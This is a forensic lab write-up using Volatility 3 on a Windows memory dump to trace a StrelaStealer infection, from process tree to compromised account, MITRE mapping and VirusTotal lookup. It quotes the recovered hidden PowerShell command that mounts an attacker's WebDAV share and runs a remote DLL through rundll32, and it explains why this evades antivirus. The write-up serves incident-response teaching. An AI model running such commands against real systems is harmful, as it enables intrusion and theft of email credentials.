## Introduce

Reconstruct a multi-stage attack by analyzing Windows memory dumps with Volatility 3, identifying malicious processes, command lines, and correlating findings with threat intelligence.

## Scenario

You are a forensic investigator at a financial institution, and your SIEM flagged unusual activity on a workstation with access to sensitive financial data. Suspecting a breach, you received a memory dump from the compromised machine. Your task is to analyze the memory for signs of compromise, trace the anomaly's origin, and assess its scope to contain the incident effectively.

Because this lab uses a Windows .dmp file, we will focus on the plugins relevant to Windows.
The first step is to list the processes running at the moment the RAM memory dump was taken in a tree structure based on parent process IDs. Volatility has a plugin for this purpose: “windows.pstree”.

![pic7](/assets/img/posts/Reveal/pic7.png)

The full command to run is: “vol -f <filename> <plugin>”

![pic8](/assets/img/posts/Reveal/pic8.png)

Because the output is quite long, I will only capture the relevant portion below.

![pic9](/assets/img/posts/Reveal/pic9.png)
![pic10](/assets/img/posts/Reveal/pic10.png)

At this point, we are mainly interested in the PID and PPID columns. Notice the process with PID 3692, whose command line is highly suspicious.

**windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry**

Explanation and reasoning:

- PPID is 4120. I traced the parent process with PID 4120 and found no results, which suggests that after spawning the child process, the parent process self-terminated to avoid detection, which is very typical of malware.
- Windowstyle hidden: runs silently without showing a window.
- net use \\45.9.74.32@8888\....: this maps a network share to a WebDAV server created by the attacker, then runs rundll32 (which can bypass some AV products), loading the DLL into memory. When ready, it executes the entry function (the exported function in the DLL).

From this, we can conclude:

- The malicious process is **powershell.exe**
- The PID is **3692**, and the PPID is **4120**.
- The malware uses **3435.dll** to execute its second-stage payload.
- The shared directory being accessed on the remote server is **davwwwroot**.

As we know, malware can abuse a Windows feature called rundll32 to load DLL libraries. Let’s briefly explore why this technique can often bypass AV detection:

1. It is a legitimate Windows file
- It is a file signed by Microsoft.
- AV products often whitelist the Windows filesystem.
- This technique is known as Live off the Land Binaries (LOLBins).

2. Normal behavior
- This binary is commonly used for legitimate tasks, making it harder for AV to distinguish legitimate activity from malicious actions.

3. DLLs are not scanned as heavily as executables
- AV products often focus more heavily on scanning .exe files.
- DLL files loaded from remote sources are sometimes not scanned before being loaded.

4. Connection to the example above
- The DLL is loaded directly from the network rather than written to disk.
- AV scans only local disk files and therefore misses this entirely.

This is why modern AV solutions need EDR and behavioral analysis in addition to signature-based detection.

In addition, to support mitigation and malware response, it is essential to map techniques and tactics to the MITRE ATT&CK framework.
Based on the rundll32 behavior, we can easily look up the relevant MITRE sub-technique ID for abusing rundll32 (as shown below).

![pic11](/assets/img/posts/Reveal/pic11.png)

The sub-technique ID here is **T1218.011**.

Identifying the username used by the malicious process helps assess the compromised account and the potential impact. To do this, I used the “windows.getsids” plugin together with “grep 3692” to focus on the relevant process.

![pic12](/assets/img/posts/Reveal/pic12.png)

The compromised user account is **Elon**.

The last step is to investigate the malware family so that the attack can be compared with known threats and appropriate defenses can be developed.

Focusing on the command line again, we can see that the attacker IP is 45.9.74.32. By using threat intelligence platforms such as VirusTotal, we can often identify the malware family.

![pic13](/assets/img/posts/Reveal/pic13.png)

Based on the information found, I determined that this malware family is **STRELASTEALER**.
- **STRELASTEALER** is a malware family that actively steals email accounts from Outlook and Thunderbird and is often delivered inside an ISO.

Through this lab, we have learned:

**1. Volatility 3** - Analyzing Windows memory dumps using basic plugins

**2. Process Analysis** - Using windows.pstree to read PID/PPID and detect parent processes that self-terminate after spawning a child (a malware indicator)

**3. Malware Behavior** - Recognizing suspicious indicators in the command line: -windowstyle hidden, net use WebDAV, and rundll32 loading a fileless DLL

**4. LOLBins** - Understanding why rundll32 can bypass AV (a legitimate Windows binary and a payload that never touches disk)

**5. windows.getsids** - Identifying the compromised user account

**6. MITRE ATT&CK** - Mapping the attack techniques and identifying sub-technique T1218.011

**7. Threat Intelligence** - Using VirusTotal to investigate the attacker IP and identify the STRELASTEALER malware family
